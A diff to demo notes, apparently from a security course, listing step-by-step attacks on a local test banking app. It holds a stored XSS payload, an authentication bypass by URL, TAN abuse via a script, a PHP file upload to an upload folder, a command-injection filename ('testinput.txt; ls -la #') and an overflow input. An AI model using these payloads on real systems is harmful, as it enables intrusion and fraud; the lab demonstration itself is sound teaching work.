@@ -2,7 +2,7 @@ Steps for demo
  
 > Register user with own email to get the TAN codes 
 ==============================================================
-SHOWCASING CODE INJECTION 
+SHOWCASING STORED XXS
 ==============================================================
 > get Registration to show a gif of Barney via code injection
 <img src='http://frcy.org/static/barney.gif' />
@@ -56,3 +56,47 @@ SHOWCASING UPLOADING MALICIOUS FILE
 ==============================================================
 testinput.txt hackhackhackhackhack 2>&1 #
 testinput.txt hackhackhackhackhackhackhackhackhackhack 2>&1 #
+
+
+
+==============================================================
+URLS only
+==============================================================
+# Start
+- http://localhost:42080
+
+# Registration (XXS)
+- http://localhost:42080/register.php
+- Name: bar<script>alert('XXS');</script>
+
+# Approve user (Authentication bypass)
+- Id from http://localhost:42080/customer_home.php
+- http://localhost:42080/approveuser.php?userid=2
+
+# Use 100 TANs and transfer money to self (BL)
+- python3 such_secure.py
+	Command: 2
+	Insert username: Flowm
+	Insert password: qwert
+	Command: 4
+	Insert an amount for every transaction: 10
+	Insert the start TAN: 0
+	Insert the end TAN: 100
+- http://localhost:42080/tran.php
+
+# Send money without TAN (BL)
+- http://localhost:42080/tran.php
+- Send 5000 without TAN
+- Description: <img src='http://frcy.org/static/d.gif' />
+
+# Batch transaction (Upload malicious file)
+- http://localhost:42080/tran.php
+- Upload myUpload.php (500 Characters limit)
+- http://localhost:42080/upload/
+- Upload legenedary.php with my myUpload.php
+
+# Batch transaction (Command injection)
+- Upload 'testinput.txt; ls -la #'
+
+# Batch transaction (Buffer overflow)
+- Upload 'testinput.txt hackhackhackhackhack 2>&1 #'
